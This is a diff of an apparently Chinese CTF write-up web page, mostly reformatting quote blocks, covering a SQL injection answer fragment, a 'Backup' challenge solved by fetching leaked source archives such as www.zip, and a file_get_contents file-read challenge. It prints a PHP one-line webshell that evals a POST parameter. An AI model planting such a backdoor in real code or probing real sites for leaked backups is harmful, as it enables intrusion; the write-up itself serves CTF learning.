@@ -215,7 +215,11 @@ union select name from flag;
 </blockquote>
 <h3 id="12-Backup"><a href="#12-Backup" class="headerlink" title="12.  Backup"></a>12.  Backup</h3><p>题目给了提示是backup。应该考查的是源码泄漏，通常在url后面输入”www.tar.gz”、”www.rar”、”www.zip”、”backup.tar.gz”、”backup.rar”、”backup.zip”等等。此题在输入www.zip的时候就已经出现了。整个源码被dump之后在所有源码里搜索危险函数如“``”、“eval()”、“system()”等等。而在这道题中，我们可以在about/show.php中的第8行找到了如下代码</p>
 <blockquote>
-<p>if(isset($_POST[‘welcome’])){eval($_POST[‘welcome’]);}<br>很明显是一句话木马，然后怎么得到flag就不用说了吧<br>fctf{C12D20EC<strong><strong>**</strong></strong>B8D270A99AC50E}</p>
+<p>if(isset($_POST[‘welcome’])){eval($_POST[‘welcome’]);}</p>
+</blockquote>
+<p>很明显是一句话木马，然后怎么得到flag就不用说了吧</p>
+<blockquote>
+<p>fctf{C12D20EC<strong><strong>**</strong></strong>B8D270A99AC50E}</p>
 </blockquote>
 <h3 id="13-File-get-contents"><a href="#13-File-get-contents" class="headerlink" title="13. File_get_contents"></a>13. File_get_contents</h3><p>这道题，出了点失误。我本来是思路是ssrf，想考察一下对PHP中file_get_contents()函数的用法。结果没成功成了文件读取了。直接读取flag文件就行。</p>
 <blockquote>
